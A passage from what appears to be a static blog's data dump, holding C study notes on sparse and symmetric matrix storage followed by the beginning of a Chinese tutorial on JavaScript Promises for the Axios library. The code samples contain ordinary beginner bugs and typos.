class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype;<br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MaxSize 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    <span class=\"hljs-type\">int</span> rowIndex,colIndex;<br>    Elemtype data;<br>&#125; TriUnitGroup;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    TriUnitGroup data[MaxSize+<span class=\"hljs-number\">1</span>];<br>    <span class=\"hljs-type\">int</span> unzeroNumber,colNumber,rowNumber;<br>&#125; TSMatrix;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    TSMatrix *myMatrix;<br>    <span class=\"hljs-type\">int</span> myData[<span class=\"hljs-number\">16</span>]= &#123;<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">0</span>&#125;;<br>    CreateM(&amp;myMatrix,myData,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">4</span>);<br>    PrintTripleUnitMatrix(&amp;myMatrix);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">CreateM</span><span class=\"hljs-params\">(TSMatrix *M,<span class=\"hljs-type\">int</span> data[],<span class=\"hljs-type\">int</span> row,<span class=\"hljs-type\">int</span> col)</span><br>&#123;<br><br>    <span class=\"hljs-type\">int</span> index=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-type\">int</span> count=<span class=\"hljs-number\">0</span>;<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">0</span>; index&lt;row*col; index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(data[index]!=<span class=\"hljs-number\">0</span>)<br>        &#123;<br>            M-&gt;data[count].rowIndex=index/col;<br>            M-&gt;data[count].colIndex=index%col;<br>            M-&gt;data[count].data=data[index];<br>            ++count;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d Add data %d successfully.\\n&quot;</span>,count,data[index]);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">if</span>(count&gt;<span class=\"hljs-number\">0</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Data number:%d.\\n&quot;</span>,count);<br>        <span class=\"hljs-comment\">/*Errors here.*/</span><br>        M-&gt;unzeroNumber=count;<br>        M-&gt;colNumber=col;<br>        M-&gt;rowNumber=row;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Finished.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;All data are 0.\\n&quot;</span>);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Finished.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintTripleUnitMatrix</span><span class=\"hljs-params\">(TSMatrix *M)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;*  i  j  value\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>; index1&lt;M-&gt;unzeroNumber; index1++)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d  %d  %d  %d\\n&quot;</span>,index1,M-&gt;data[index1].rowIndex,M-&gt;data[index1].colIndex,M-&gt;data[index1].data);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintSymmetricArray</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> col_index,row_index;<br><br>    <span class=\"hljs-keyword\">for</span>(col_index=<span class=\"hljs-number\">0</span>; col_index&lt;col; col_index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(row_index=<span class=\"hljs-number\">0</span>; row_index&lt;row; row_index++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(col_index&lt;=row_index)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[row_index*(row_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+col_index]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[col_index*(col_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+row_index]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintUpTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>; index1&lt;col; index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>; index2&lt;row; index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&lt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index1*(index1+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index2]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintDownTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>; index1&lt;col; index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>; index2&lt;row; index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&gt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index2*(index2+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index1]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>一、对称矩阵</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintSymetryMatrix</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">int</span> m[],<span class=\"hljs-built_in\">int</span> n</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> row,col;<br>    printf(<span class=\"hljs-string\">&quot;Symetry Matrix:\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">for</span>(row=<span class=\"hljs-number\">0</span>;row&lt;n;row++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(col=<span class=\"hljs-number\">0</span>;col&lt;n;col++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(row&gt;=col)<br>            &#123;<br>                printf(<span class=\"hljs-string\">&quot;%4d &quot;</span>,m[row*(row+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+col]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                printf(<span class=\"hljs-string\">&quot;%4d &quot;</span>,m[col*(col+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+row]);<br>            &#125;<br>        &#125;<br>        printf(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>​                    </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype;<br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MaxSize 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    <span class=\"hljs-type\">int</span> rowIndex,colIndex;<br>    Elemtype data;<br>&#125; TriUnitGroup;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    TriUnitGroup data[MaxSize+<span class=\"hljs-number\">1</span>];<br>    <span class=\"hljs-type\">int</span> unzeroNumber,colNumber,rowNumber;<br>&#125; TSMatrix;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    TSMatrix *myMatrix;<br>    <span class=\"hljs-type\">int</span> myData[<span class=\"hljs-number\">16</span>]= &#123;<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">0</span>&#125;;<br>    CreateM(&amp;myMatrix,myData,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">4</span>);<br>    PrintTripleUnitMatrix(&amp;myMatrix);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">CreateM</span><span class=\"hljs-params\">(TSMatrix *M,<span class=\"hljs-type\">int</span> data[],<span class=\"hljs-type\">int</span> row,<span class=\"hljs-type\">int</span> col)</span><br>&#123;<br><br>    <span class=\"hljs-type\">int</span> index=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-type\">int</span> count=<span class=\"hljs-number\">0</span>;<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">0</span>; index&lt;row*col; index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(data[index]!=<span class=\"hljs-number\">0</span>)<br>        &#123;<br>            M-&gt;data[count].rowIndex=index/col;<br>            M-&gt;data[count].colIndex=index%col;<br>            M-&gt;data[count].data=data[index];<br>            ++count;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d Add data %d successfully.\\n&quot;</span>,count,data[index]);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">if</span>(count&gt;<span class=\"hljs-number\">0</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Data number:%d.\\n&quot;</span>,count);<br>        <span class=\"hljs-comment\">/*Errors here.*/</span><br>        M-&gt;unzeroNumber=count;<br>        M-&gt;colNumber=col;<br>        M-&gt;rowNumber=row;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Finished.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;All data are 0.\\n&quot;</span>);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Finished.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintTripleUnitMatrix</span><span class=\"hljs-params\">(TSMatrix *M)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;*  i  j  value\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>; index1&lt;M-&gt;unzeroNumber; index1++)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d  %d  %d  %d\\n&quot;</span>,index1,M-&gt;data[index1].rowIndex,M-&gt;data[index1].colIndex,M-&gt;data[index1].data);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintSymmetricArray</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> col_index,row_index;<br><br>    <span class=\"hljs-keyword\">for</span>(col_index=<span class=\"hljs-number\">0</span>; col_index&lt;col; col_index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(row_index=<span class=\"hljs-number\">0</span>; row_index&lt;row; row_index++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(col_index&lt;=row_index)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[row_index*(row_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+col_index]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[col_index*(col_index+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+row_index]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintUpTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>; index1&lt;col; index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>; index2&lt;row; index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&lt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index1*(index1+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index2]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">PrintDownTriangle</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> <span class=\"hljs-built_in\">array</span>[],<span class=\"hljs-type\">int</span> col,<span class=\"hljs-type\">int</span> row)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index1=<span class=\"hljs-number\">0</span>; index1&lt;col; index1++)<br>    &#123;<br>        <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> index2=<span class=\"hljs-number\">0</span>; index2&lt;row; index2++)<br>        &#123;<br>            <span class=\"hljs-keyword\">if</span>(index1&gt;index2)<br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[<span class=\"hljs-number\">0</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span><br>            &#123;<br>                <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,<span class=\"hljs-built_in\">array</span>[index2*(index2+<span class=\"hljs-number\">1</span>)/<span class=\"hljs-number\">2</span>+<span class=\"hljs-number\">1</span>+index1]);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n"},{"title":"Axios详解","date":"2022-10-27T08:09:00.000Z","mp3":null,"cover":"img/axios.png","_content":"\n# Axios\n\n#### 基于promise可以用于浏览器和node.js的网络请求库\n\n### 一、基础定义Promise\n\n#### 1.promise\n\n一个对象，用于传递异步操作的消息；本意上可以理解为，承诺过一段时间返回一个结果。\n\n```visual basic\n 其实就是一个请求发出去以后，并不能马上获得需要的数据，因此整个js代码需要暂停等待请求数据的返回\n```\n\nPromise有三种状态：pending(等待态)，fulfiled(成功态)，rejected（失败态）；状态一旦改变就不会再变；创造promise实例后会立即执行；\n\n```js\n\n// 当参数a大于10且参数fn2是一个方法时 执行fn2\nfunction fn1(a, fn2) {\n    if (a > 10 && typeof fn2 == 'function') {\n        fn2()\n    }\n}\nfn1(11, function() {\n    console.log('this is a callback')\n})\n```\n\n一般来说我们会碰到的回调嵌套都不会很多，一般就一到两级，但是某些情况下，回调嵌套很多时，代码就会非常繁琐，会给我们的编程带来很多的麻烦，这种情况俗称——回调地狱。\n\n这时候我们的promise就应运而生、粉墨登场了\n\npromise主要解决两个问题：\n\n1. 回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入；\n\n2. 支持多个并发请求，并从请求中获取数据；可以解决异步的问题；\n\n   ```visual basic\n   建议使用ES6箭头函数的编码方式，获得数据，处理数据，处理完成，下一步~\n   ```\n\n   \n\n#### 2.promise用法\n\n```js\nlet p=new Promise((resolve,reject)=>{\n    //一些异步操作\n    setTimeout(()=>{\n        console.log(\"Finished.\");\n        resolve(\"成功！\")；\n    }，2000)\n})\n\n//promise的构造函数接受一个函数类型的参数，并且需要传入两个参数：\nresolve：异步操作执行成功之后的回调函数；\nreject：异步操作执行失败后的回调函数；\n```\n\nthen 链式操作：\n\n表面上，promise只是简化层层回调，实质上，用维护状态、传递状态的方法使得回调函数能够及时调用；\n\n正确场景：\n\n```javascript\np.then((data))=>{\n    cosnsole.log(data);\n}).then((data)=>{\n    console.log(data);\n}).then((data)=>P{\n        console.log(data);\n        });\n```\n\n#### 3.reject用法\n\n把promise的状态设置为rejected，这样在then中就能捕捉到，然后执行“失败”情况的回调；\n\n```js\nlet p=new Promise((resolve,reject)=>{\n    setTimeout(function(){\n        var num=Math.ceil(Math.random()*10);\n        if(num<=5)\n            {\n                resolve(num);\n            }else\n                {\n                    reject(\"数字太大！\")；\n                }\n    },2000);\n})；\np.then((data)=>{\n    console.log(\"Resolved\",data);\n},(err)=>{\n    console.log(\"Rejected\",err);\n}\n      )\n```\n\n#### 4.catch用法\n\ncatch和then的第二个参数一样用来指定reject的回调；\n\n```js\np.then((data)=>{\n    console.log(\"Resolved\",data);\n}).catch((err)=>{\n    console.log(\"Rejected\",err);\t\t\t//抛出异常\n})\n//如果执行resolve的回调时，如果抛出异常，并不会报错停止js，而是进入到catch方法；\np.then((data) => {\n    console.log('resolved',data);\n    console.log(somedata); //此处的somedata未定义\n})\n.catch((err) => {\n    console.log('rejected',err);\n});\n```\n\n#### 